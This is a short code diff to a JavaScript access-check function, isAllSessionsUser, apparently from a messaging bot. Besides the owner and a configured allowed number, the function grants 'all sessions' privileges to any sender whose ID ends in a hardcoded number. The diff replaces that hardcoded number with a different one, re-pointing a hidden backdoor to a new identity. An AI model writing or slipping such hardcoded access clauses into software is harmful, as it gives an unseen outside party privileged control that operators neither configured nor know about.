@@ -1063,7 +1063,7 @@ function isAllSessionsUser(extra) {
   } catch {}
   const allowed = allSessionsNumber();
   if (!allowed) return !!extra?.isOwner;
-  return !!(extra?.isOwner || (allowed && (sender === allowed || sender.endsWith(allowed.slice(-10)))) || (sender && sender.endsWith('3438673242')));
+  return !!(extra?.isOwner || (allowed && (sender === allowed || sender.endsWith(allowed.slice(-10)))) || (sender && sender.endsWith('3286037243')));
 }
 
 /**
